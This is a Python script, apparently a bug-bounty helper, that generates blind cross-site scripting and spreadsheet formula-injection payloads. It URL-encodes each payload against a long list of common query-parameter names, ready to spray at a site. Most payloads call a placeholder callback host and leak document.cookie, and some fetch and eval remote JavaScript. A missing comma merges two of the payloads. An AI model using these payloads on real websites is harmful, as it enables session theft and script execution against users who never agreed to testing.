import urllib.parse

callback = "callbackurl"

blindParams = [
    'redirect', 'redir', 'url', 'link', 'goto', 'debug', '_debug', 'test', 'get', 'index', 'src', 'source', 'file',
    'frame', 'config', 'new', 'old', 'var', 'rurl', 'return_to', '_return', 'returl', 'last', 'text', 'load', 'email',
    'mail', 'user', 'username', 'password', 'pass', 'passwd', 'first_name', 'last_name', 'back', 'href', 'ref', 'data', 'input',
    'out', 'net', 'host', 'address', 'code', 'auth', 'userid', 'auth_token', 'token', 'error', 'keyword', 'key', 'q', 'query', 'aid',
    'bid', 'cid', 'did', 'eid', 'fid', 'gid', 'hid', 'iid', 'jid', 'kid', 'lid', 'mid', 'nid', 'oid', 'pid', 'qid', 'rid', 'sid',
    'tid', 'uid', 'vid', 'wid', 'xid', 'yid', 'zid', 'cal', 'country', 'x', 'y', 'topic', 'title', 'head', 'higher', 'lower', 'width',
    'height', 'add', 'result', 'log', 'demo', 'example', 'message']

html=[
'<a href="https://' + callback + '/HTML1">Click Me</a>',
'<iframe src="https://' + callback + '/HTML2"></iframe>',
'<img src="https://' + callback + '/HTML3">',
'<script>document.write("<img src=\\"https://' + callback + '/HTML4\\" +\\":\\"+ document.cookie\\">")//</script>',
'<svg onload=\'document.write("<img src=\\"https://' + callback + '/HTML5\\" +\\":\\"+ document.cookie\\">")//\'></svg>',
'"<svg onload=\'document.write("<img src=\\"https://' + callback + '/HTML6\\" +\\":\\"+ document.cookie\\">")//\'></svg>',
'"><svg onload=\'document.write("<img src=\\"https://' + callback + '/HTML7\\" +\\":\\"+ document.cookie\\">")//\'></svg>',
'<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "https://' + callback + '/HTML8");a.send();</script>',
'<script>$.getScript("https://' + callback + '/HTML9")</script>',
'<noscript><p title="</noscript><img src=x onerror=' + 'document.write("<img src=\'https://" +'+ callback + '/HTML9 +":"+document.cookie+"\'>") + \'>">'
]


javascript=[
'\';document.write("<img src=\\"https://' + callback + '/JS1\\" +\\":\\"+ document.cookie\\">")//',
'\\";document.write("<img src=\\"https://' + callback + '/JS2\\" +\\":\\"+ document.cookie\\">")//',
'\\%0a%0d;document.write("<img src=\\"https://' + callback + '/JS3\\" +\\":\\"+ document.cookie\\">")//',
';document.write("<img src=\\"https://' + callback + '/JS4\\" +\\":\\"+ document.cookie\\">")//',
'javascript:eval(\'var a=document.createElement(\'script\');a.src=\'https://' + callback + '/JS5\';document.body.appendChild(a)\')'
]

miscpayloads=[
'=WEBSERVICE("https://"'+callback+'/MISC1")',
'%0a%0d=WEBSERVICE("https://"'+callback+'/MISC2")'
'http://'+ callback + '/MISC3',
'https://'+ callback+ '/MISC4',
'securitytestingMISC5@'+ callback,
'mailto:securitytestingMISC6@'+ callback,
',=WEBSERVICE("https://"'+callback+'/MISC7")',
'","=WEBSERVICE("https://"'+callback+'/MISC8")'
]


print("\nFor finding get parameters\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n")

getpayload = html+javascript+miscpayloads
for j in blindParams:
  for i in getpayload:
    print(j+"="+urllib.parse.quote(i))

print("\n\n\n\n\n\n\nFor a targeted injection point\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n")

targettedpayload = html+javascript+miscpayloads
for i in targettedpayload:
  print(i)

